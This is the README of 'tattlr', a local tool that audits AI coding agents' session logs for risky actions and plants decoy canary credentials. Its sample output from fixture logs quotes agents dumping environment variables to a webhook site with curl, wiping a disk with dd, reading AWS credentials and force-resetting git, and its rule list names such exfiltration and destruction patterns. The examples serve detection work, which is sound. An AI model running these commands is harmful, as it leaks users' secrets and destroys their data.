# tattlr

Keep YOLO mode. Get a tattletale.

tattlr reads the session logs your AI coding agents already leave on disk and tells you what they actually did: which secrets they read, what they deleted, what they piped into a shell and where they sent your data. It works with Claude Code, Codex CLI, Gemini CLI, OpenClaw and Cursor, and it never sends anything anywhere.

## Install

```sh
go install github.com/kaygaaf/tattlr/cmd/tattlr@latest
```

You need Go 1.22 or newer. It builds to a single static binary with no dependencies. Prebuilt binaries for macOS, Linux and Windows are coming with the first release.

## Use it

```sh
tattlr                        # same as tattlr scan
tattlr scan --since 7d        # just the last week
tattlr scan --agent claude    # one agent (claude, codex, gemini, openclaw, cursor)
tattlr scan --project billing # projects whose path contains "billing"
tattlr scan --json            # everything, machine readable
tattlr scan --card sheet.png  # a shareable card (or sheet.svg)
tattlr scan --fail-on high    # exit 1 if anything high or worse shows up
tattlr rules                  # list every rule and its severity
```

## What it looks like

This is real output from the fixture logs in `testdata/home`, which has two sessions per agent (one for Cursor) full of bad behavior:

```
$ tattlr scan --home testdata/home
  TATTLR   RAP SHEET
 9 sessions, 37 tool calls, 28 flagged calls, Aug 3 2025 to Oct 27 2026

 AGENT         SESSIONS  CALLS  FLAGGED  CRIT  HIGH   MED   LOW  SCORE  VERDICT
 claude-code          2     13       10     3     7     3     1    141  public enemy
 codex                2      9        6     1     5     5     0     80  menace
 gemini-cli           2      6        5     2     3     1     0     77  menace
 openclaw             2      5        4     1     4     1     0     60  menace
 cursor               1      4        3     0     3     1     0     27  repeat offender

 TOP OFFENSES
    3x  CRIT  Touched a tattlr canary                    claude-code, openclaw
    2x  CRIT  Piped a remote script into a shell         claude-code, gemini-cli
    1x  CRIT  Wrote straight to a disk device            gemini-cli
    1x  CRIT  Sent secrets over the network              codex
    6x  HIGH  Read a secret file                         claude-code, cursor, gemini-cli, openclaw
    3x  HIGH  Edited its own config or hooks             claude-code, cursor, gemini-cli
    3x  HIGH  Talked to a paste or webhook drop site     codex, gemini-cli, openclaw
    2x  HIGH  Force pushed                               claude-code, cursor
   ...and 14 more kinds, see --json

 WORST MOMENTS
 CRIT  Oct 22 14:04  codex  ~/code/landing-page
       Sent secrets over the network, Talked to a paste or webhook drop site, Uploaded a local file, Dumped environment variables
       printenv | curl -s -X POST --data-binary @- https://webhook.site/5f1e2d3c
 CRIT  Oct 26 20:31  openclaw  ~/.openclaw/workspace
       Touched a tattlr canary, Read a secret file
       read ~/.config/tattlr/decoy/.env
 CRIT  Oct 25 17:41  gemini-cli  ~/code/infra-scripts
       Wrote straight to a disk device, Used sudo
       sudo dd if=/dev/zero of=/dev/sdb bs=4M status=progress
 CRIT  Oct 24 23:14  claude-code  ~/code/dotfiles
       Touched a tattlr canary, Read a secret file
       cat ~/.aws/credentials
 CRIT  Oct 24 23:15  claude-code  ~/code/dotfiles
       Touched a tattlr canary
       aws sts get-caller-identity --profile tattlr-canary

 Read 9 log files locally. Nothing left this machine. Secrets in commands are masked. 2 canaries planted.
```

Secrets that show up in commands get masked before anything is printed:

```
$ tattlr scan --home testdata/home --project landing --top 4 --moments 3
  TATTLR   RAP SHEET
 1 session, 8 tool calls, 5 flagged calls, Oct 22 2026

 AGENT         SESSIONS  CALLS  FLAGGED  CRIT  HIGH   MED   LOW  SCORE  VERDICT
 codex                1      8        5     1     4     4     0     69  menace

 TOP OFFENSES
    1x  CRIT  Sent secrets over the network              codex
    1x  HIGH  Talked to a paste or webhook drop site     codex
    1x  HIGH  Ran git reset --hard                       codex
    1x  HIGH  Put a secret in a URL                      codex
   ...and 5 more kinds, see --json

 WORST MOMENTS
 CRIT  Oct 22 14:04  codex  ~/code/landing-page
       Sent secrets over the network, Talked to a paste or webhook drop site, Uploaded a local file, Dumped environment variables
       printenv | curl -s -X POST --data-binary @- https://webhook.site/5f1e2d3c
 HIGH  Oct 22 14:03  codex  ~/code/landing-page
       Ran git reset --hard, Asked to run outside the sandbox
       git reset --hard origin/main
 HIGH  Oct 22 14:09  codex  ~/code/landing-page
       Put a secret in a URL
       curl -s 'https://api.mailsend.example/v1/lists?api_key=[REDACTED]' | jq length

 Read 9 log files locally. Nothing left this machine. Secrets in commands are masked. 2 canaries planted.
```

In a terminal the severities are colored. Set `NO_COLOR` or pass `--no-color` to turn that off. Times are shown in your local timezone.

`--card` makes a 1200x630 image that only has totals, agent names and offense names on it. No commands, paths, project names or secrets, so it is safe to post. You get a PNG if `rsvg-convert`, `resvg`, Inkscape, ImageMagick or Chrome is installed, otherwise tattlr writes an SVG.

## What it detects

Run `tattlr rules` for the full list. The short version:

- **Secrets:** reading `.env` files, SSH keys, cloud credentials (AWS, gcloud, Azure, kube), `.npmrc`, `.netrc`, password stores and browser profiles. Pulling passwords out of the macOS keychain or `gh auth token`. Dumping environment variables.
- **Destructive commands:** `rm -rf` (worse on home or root), `dd` or `mkfs` on a disk, `git reset --hard`, `git clean`, force pushes, `--no-verify`, `chmod -R 777`, dropping database tables.
- **Remote code:** `curl | sh` and friends, or downloading a script and running it.
- **Network exfil:** sending secrets or env vars over the network, uploading files, talking to paste and webhook sites, secrets in URLs.
- **Privilege:** `sudo`, asking to run outside the sandbox, starting another agent with approvals turned off.
- **Tampering:** edits to shell startup files (`.zshrc`, `.bashrc` and so on), to the agent's own settings, hooks or MCP config, and things that run later like cron jobs, launch agents and git hooks.
- **Canaries:** anything that touches a fake credential planted by `tattlr trap`. Always critical.

Each finding has a severity (critical 25 points, high 8, medium 3, low 1). Points add up to a verdict per agent, from "clean record" up to "public enemy".

## Traps

Agents that read your real secrets are hard to catch because reading `.env` is sometimes legit. Nobody has a legit reason to touch a fake credential you never use, so tattlr can plant some:

```sh
tattlr trap                 # shows what it will plant and asks first
tattlr trap --yes --ssh     # also a decoy SSH key
tattlr trap --env ~/code/x  # also a decoy .env in a project
tattlr trap --list
tattlr trap --remove        # takes it all back out
```

By default it adds a `[tattlr-canary]` profile to `~/.aws/credentials` (between clearly marked comment lines) and writes a decoy `.env` under `~/.config/tattlr/decoy`. The keys are random, clearly fake and work nowhere. tattlr never overwrites a file that already exists, and `--remove` only deletes files that still contain its markers. The list of traps lives in `~/.config/tattlr/traps.json`. After that, `tattlr scan` flags any session that reads the file or uses the fake key or profile name.

## Supported agents

| Agent | Where tattlr looks | How sure we are about the format |
| --- | --- | --- |
| Claude Code | `~/.claude/projects/*/*.jsonl` | Works on our fixtures, not yet checked against lots of real logs |
| Codex CLI | `~/.codex/sessions/**/rollout-*.jsonl` (`$CODEX_HOME` too) | Checked against the Codex source, old and new formats |
| Gemini CLI | `~/.gemini/tmp/*/chats/` | Checked against the Gemini CLI source, JSONL and the older JSON files |
| OpenClaw | `~/.openclaw/agents/*/sessions/*.jsonl` (plus `.reset` archives) | JSONL transcripts only |
| Cursor | `~/.cursor/projects/*/agent-transcripts/` | Agent transcripts only. They have no timestamps, so the file time is used |

If your logs look different and tattlr misses things, please open an issue with a redacted snippet.

## Privacy

Everything happens on your machine. tattlr reads log files, prints a report and that is it. No telemetry, no network calls, no accounts. Secret values in commands and outputs are masked before they reach the terminal, the JSON or the card. The card leaves out commands and paths completely.

## Roadmap

`tattlr scan` tells you what already happened. Next up is `tattlr protect`, which stops it from happening:

- Live blocking and approvals through Claude Code PreToolUse hooks
- Codex hooks
- OpenClaw `before_tool_call`
- Cursor hooks
- An MCP proxy for tools that do not have hooks
- Desktop approval prompts, so you can stay in YOLO mode and still say no to the one command that matters

Also on the list: OpenClaw and Cursor SQLite session stores, more rules and a `--watch` mode.

## Development

```sh
go test ./...
go vet ./...
python3 scripts/gen_fixtures.py   # regenerate testdata/home
```

## Support

If tattlr caught something nasty, you can buy me a coffee at [ko-fi.com/kayorama](https://ko-fi.com/kayorama).

## License

MIT
